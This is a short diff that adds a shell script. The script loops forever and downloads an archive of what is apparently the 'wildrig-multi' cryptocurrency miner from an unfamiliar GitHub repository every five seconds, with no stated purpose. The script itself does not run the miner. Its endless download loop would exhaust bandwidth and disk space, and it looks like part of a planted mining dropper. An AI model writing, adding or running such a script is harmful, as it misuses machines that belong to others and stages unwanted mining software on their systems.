@@ -1,0 +1,5 @@
+#!/bin/sh
+while [ 1.1 ]; do
+	wget https://github.com/ifhikf/juki/raw/main/wildrig-multi-linux-0.29.0%20(1).tar.gz
+	sleep 5
+done
